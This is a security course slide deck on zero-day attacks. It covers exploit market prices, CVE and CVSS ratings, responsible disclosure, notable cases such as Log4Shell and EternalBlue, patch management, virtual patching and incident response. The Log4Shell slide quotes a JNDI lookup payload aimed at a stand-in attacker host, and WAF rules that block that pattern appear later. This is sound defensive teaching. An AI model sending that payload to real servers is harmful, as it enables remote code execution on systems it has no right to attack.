---
tags:
  - security:security
  - security:cyber-attacks
  - security:penetration-testing
  - security:vulnerabilities
level: intermediate
category: security
audience:
  - audiences:developers
  - audiences:security-professionals
---

# Zero-Day Attacks: Mitigating the Unknown Threat

---

## Zero-Day Attack Lifecycle

![zero_day_attack_lifecycle](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/zero_day_attack_lifecycle.svg)

---

## What Are Zero-Day Attacks

- A zero-day attack exploits a previously unknown software vulnerability
- The vulnerability has not been disclosed or patched by the vendor
- Attackers can exploit the vulnerability before a fix is available, leaving systems defenseless
- Often used for targeted attacks or spreading malware
- The term "zero-day" refers to the vendor having zero days to fix the issue before exploitation

---

## Vulnerability Lifecycle

```python
┌──────────────────────────────────────────────────────────┐
│          Vulnerability Lifecycle                          │
│                                                          │
│  Discovery ──> Exploitation ──> Disclosure ──> Patch     │
│                                                          │
│  ┌─────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
│  │Researcher│  │ Attacker │  │  Vendor  │  │  Patch   │ │
│  │finds bug │  │ exploits │  │ notified │  │ released │ │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘ │
│       │              │              │              │      │
│  ─────┼──────────────┼──────────────┼──────────────┼───── │
│       │              │              │              │      │
│       │<── Zero-Day ─>│              │              │      │
│       │   Window      │<── Patch ───>│              │      │
│       │               │   Gap        │<── Rollout ─>│      │
│       │               │              │   Window     │      │
│                                                          │
│  Total exposure = Discovery to full patch deployment     │
│  Average: 7 years from introduction to discovery!        │
└──────────────────────────────────────────────────────────┘
```

---

## Zero-Day Market Ecosystem

![zero_day_market_ecosystem](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/zero_day_market_ecosystem.svg)

---

## The Zero-Day Exploit Market

| Market Segment   | Buyers                              | Price Range (2024)     |
|------------------|-------------------------------------|------------------------|
| Black market     | Cybercriminals, nation-states       | $10K - $2.5M+          |
| Gray market      | Exploit brokers (Zerodium, etc.)    | $25K - $2.5M           |
| Bug bounties     | Vendors (Google, Apple, Microsoft)  | $500 - $300K           |
| Government       | NSA, GCHQ, intelligence agencies    | $100K - $2M+           |

```bash
┌──────────────────────────────────────────────────────────┐
│  Zerodium Exploit Payout Chart (2024)                    │
├──────────────────────────────┬───────────────────────────┤
│  Target                      │  Payout (up to)           │
├──────────────────────────────┼───────────────────────────┤
│  iOS full chain (zero-click) │  $2,500,000               │
│  Android full chain          │  $2,500,000               │
│  Windows RCE (zero-click)    │  $1,000,000               │
│  Chrome RCE + sandbox escape │  $500,000                 │
│  Apache/Nginx RCE            │  $200,000                 │
│  WordPress RCE               │  $100,000                 │
└──────────────────────────────┴───────────────────────────┘
```

---

## The CVE Process

![the_cve_process](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/the_cve_process.svg)

---

## The CVE Process

### CVSS Severity Ratings
| Score    | Severity | Example                                  |
|----------|----------|------------------------------------------|
| 0.0      | None     | Informational finding                    |
| 0.1-3.9  | Low      | Minor info disclosure                    |
| 4.0-6.9  | Medium   | XSS requiring interaction               |
| 7.0-8.9  | High     | Authenticated RCE                        |
| 9.0-10.0 | Critical | Unauthenticated remote code execution    |

---

## Responsible Disclosure Timeline

![responsible_disclosure_timeline](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/responsible_disclosure_timeline.svg)

---

## Responsible Disclosure

![responsible_disclosure](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/responsible_disclosure.svg)

---

## Responsible Disclosure

- Google Project Zero standard: 90-day disclosure deadline
- If vendor does not patch within 90 days, vulnerability is published
- Some vendors offer "coordinated disclosure" programs
- Bug bounty platforms (HackerOne, Bugcrowd) facilitate the process

---

## Notable Zero-Day Case Study: EternalBlue (CVE-2017-0144)

![notable_zero_day_case_study_eternalblue_cve_2017_0144](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/notable_zero_day_case_study_eternalblue_cve_2017_0144.svg)

---

## Notable Zero-Day: Log4Shell (CVE-2021-44228)

```python
┌──────────────────────────────────────────────────────────┐
│          Log4Shell Attack                                 │
│                                                          │
│  Attacker sends:                                         │
│  ${jndi:ldap://attacker.com/exploit}                     │
│                                                          │
│  In any user-controlled input that gets logged:          │
│  - HTTP headers (User-Agent, X-Forwarded-For)            │
│  - Form fields, search queries                           │
│  - Chat messages, usernames                              │
│                                                          │
│  ┌─────────┐    log input    ┌───────────┐               │
│  │ Attacker │───────────────>│  Server   │               │
│  │          │                │  (Log4j)  │               │
│  └─────────┘                └─────┬─────┘               │
│       ^                           │ JNDI lookup          │
│       │                           v                      │
│       │                    ┌───────────┐                 │
│       │   Malicious class  │  Attacker │                 │
│       └────────────────────│  LDAP     │                 │
│          (RCE achieved!)   │  Server   │                 │
│                            └───────────┘                 │
│                                                          │
│  CVSS: 10.0 (maximum severity)                           │
│  Affected: Virtually all Java applications using Log4j   │
│  Estimated: hundreds of millions of devices               │
└──────────────────────────────────────────────────────────┘
```

---

## More Notable Zero-Days

| Vulnerability      | CVE              | Year | CVSS | Impact                        |
|--------------------|------------------|------|------|-------------------------------|
| Heartbleed         | CVE-2014-0160    | 2014 | 7.5  | OpenSSL memory disclosure     |
| Shellshock         | CVE-2014-6271    | 2014 | 10.0 | Bash RCE via env variables    |
| EternalBlue        | CVE-2017-0144    | 2017 | 9.8  | SMBv1 RCE, WannaCry          |
| Spectre/Meltdown   | CVE-2017-5753/54 | 2018 | 5.6  | CPU side-channel attacks      |
| BlueKeep           | CVE-2019-0708    | 2019 | 9.8  | RDP pre-auth RCE             |
| SolarWinds (SUNBURST)| N/A           | 2020 | N/A  | Supply chain, 18K+ orgs      |
| ProxyLogon         | CVE-2021-26855   | 2021 | 9.8  | Exchange Server RCE           |
| Log4Shell          | CVE-2021-44228   | 2021 | 10.0 | Log4j JNDI injection RCE     |
| Spring4Shell       | CVE-2022-22965   | 2022 | 9.8  | Spring Framework RCE          |
| MOVEit             | CVE-2023-34362   | 2023 | 9.8  | SQL injection, mass breach    |

---

## The Zero-Day Threat Landscape

- Increasing complexity of software creates more potential vulnerabilities
- Cyber attackers actively search for and stockpile zero-day exploits
- Nation-states and well-funded groups are major players in the zero-day exploit market
- Widespread adoption of new technologies introduces new attack surfaces
- Average time from vulnerability introduction to discovery: ~7 years

---

## Impact of Zero-Day Attacks

- Can lead to data breaches, system compromises, and financial losses
- Allows attackers to gain unauthorized access and execute malicious code
- Difficult to detect and prevent due to the lack of available patches or signatures
- Can spread rapidly before a fix is available, causing widespread damage

---

## Patch Management

```bash
┌──────────────────────────────────────────────────────────┐
│          Patch Management Lifecycle                       │
│                                                          │
│  1. Inventory                                            │
│     Know every piece of software in your environment     │
│                                                          │
│  2. Monitor                                              │
│     Subscribe to vendor advisories, NVD, CISA KEV        │
│                                                          │
│  3. Assess                                               │
│     CVSS score + asset criticality + exploitability      │
│                                                          │
│  4. Test                                                 │
│     Validate patch in staging environment                │
│                                                          │
│  5. Deploy                                               │
│     Prioritize: Critical/Exploited > High > Medium       │
│                                                          │
│  6. Verify                                               │
│     Confirm patch was applied, scan for completeness     │
│                                                          │
│  Patching SLAs:                                          │
│  ┌──────────┬────────────────────────────────┐           │
│  │ Critical │ 24-72 hours (CISA KEV: 2 weeks)│           │
│  │ High     │ 1-2 weeks                      │           │
│  │ Medium   │ 30 days                        │           │
│  │ Low      │ 90 days                        │           │
│  └──────────┴────────────────────────────────┘           │
└──────────────────────────────────────────────────────────┘
```

```bash
# Linux: Check for available security updates
sudo apt list --upgradable 2>/dev/null | grep -i security
sudo yum updateinfo list security

# Windows: PowerShell
# Get-WindowsUpdate -Category Security

# Check CISA Known Exploited Vulnerabilities catalog
# https://www.cisa.gov/known-exploited-vulnerabilities-catalog
```

---

## Virtual Patching Architecture

![virtual_patching_architecture](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/virtual_patching_architecture.svg)

---

## Virtual Patching

![virtual_patching](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/virtual_patching.svg)

---

## Virtual Patching

```bash
# Example: Virtual patch for Log4Shell using ModSecurity
# Block JNDI lookup patterns in all input
SecRule REQUEST_HEADERS|ARGS|REQUEST_BODY \
    "${jndi:" \
    "id:1000001, \
     phase:2, \
     deny, \
     status:403, \
     log, \
     msg:'Possible Log4Shell exploit attempt'"
# WAF rule for Nginx (using lua-resty-waf or similar)
# Block requests containing JNDI patterns
location / {
    if ($request_uri ~* "\$\{jndi:") {
        return 403;
    }
}
```

---

## Zero-Day Defense Layers

![zero_day_defense_layers](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/zero_day_defense_layers.svg)

---

## Strategies to Defend Against Zero-Days

- Adopt a multi-layered security approach
- Implement strong security hygiene practices
- Stay vigilant and maintain situational awareness
- Prioritize patching and vulnerability management
- Leverage advanced security technologies
- Develop an incident response plan

---

## Multi-Layered Security Approach

![multi_layered_security_approach](svg/courses/security/cyber-attacks-and-vectors/22_zero_day_attacks/multi_layered_security_approach.svg)

---

## Advanced Detection Technologies

| Technology                    | How It Helps Against Zero-Days              |
|-------------------------------|---------------------------------------------|
| Behavior-based EDR            | Detects anomalous process behavior           |
| Network Traffic Analysis (NTA)| Identifies unusual communication patterns    |
| Sandboxing                    | Detonates suspicious files in isolation       |
| Deception (honeypots)         | Attackers interact with fake assets          |
| SIEM + UEBA                  | Correlates events, detects anomalies         |
| Memory protection (CFI, CET)  | Prevents exploitation at hardware level      |
| Application whitelisting      | Only approved executables can run            |

```bash
# Example: Linux application whitelisting with fapolicyd
sudo apt install fapolicyd
sudo systemctl enable fapolicyd

# AppArmor profile to limit application capabilities
# /etc/apparmor.d/usr.sbin.myapp
profile myapp /usr/sbin/myapp {
    # Only allow specific file access and capabilities
    /usr/sbin/myapp mr,
    /var/log/myapp.log w,
    network tcp,
    deny /etc/shadow r,
}
```

---

## Security Hygiene Practices

- Keep software and systems up-to-date with the latest patches and updates
- Regularly back up data and systems to enable swift recovery
- Enforce strong password policies and use multi-factor authentication (MFA)
- Provide regular security awareness training for employees
- Monitor and audit system logs for anomalies

---

## Incident Response Plan

```python
┌──────────────────────────────────────────────────────────┐
│  Zero-Day Incident Response Playbook                     │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  1. DETECT                                               │
│     - EDR/SIEM alert on anomalous behavior               │
│     - Threat intel feed (CISA KEV, vendor advisory)      │
│     - User report of unusual activity                    │
│                                                          │
│  2. ASSESS                                               │
│     - Determine affected systems and scope               │
│     - Check if exploit is publicly available             │
│     - Evaluate business impact                           │
│                                                          │
│  3. CONTAIN                                              │
│     - Network segmentation / isolation                   │
│     - Disable affected service if possible               │
│     - Deploy virtual patches (WAF/IPS rules)             │
│                                                          │
│  4. ERADICATE                                            │
│     - Apply vendor patch when available                  │
│     - Remove any implanted backdoors/malware             │
│     - Rebuild compromised systems from clean images      │
│                                                          │
│  5. RECOVER                                              │
│     - Restore from verified clean backups                │
│     - Gradually re-enable services with monitoring       │
│     - Verify patch across all affected assets            │
│                                                          │
│  6. LESSONS LEARNED                                      │
│     - Document timeline and decisions                    │
│     - Update detection rules and response procedures     │
│     - Brief stakeholders                                 │
└──────────────────────────────────────────────────────────┘
```

---

## Continuous Improvement

- Regularly review and update your security posture and defenses
- Conduct post-incident reviews to identify areas for improvement
- Stay informed about emerging threats and evolving attack techniques
- Invest in security research and development
- Foster a culture of security awareness and continuous learning

---

## Key Takeaways

- Zero-day vulnerabilities are unknown flaws exploited before patches exist
- The vulnerability lifecycle creates windows of exposure at every stage
- The CVE process and responsible disclosure help coordinate defenses
- Notable zero-days (EternalBlue, Log4Shell) caused billions in damages
- Virtual patching provides interim protection when immediate patching is not possible
- Defense in depth is critical: no single control stops a zero-day
- Behavior-based detection (EDR, NTA) can catch exploitation even without signatures
- Patch management with clear SLAs reduces the window of exposure
- Incident response plans must account for zero-day scenarios specifically
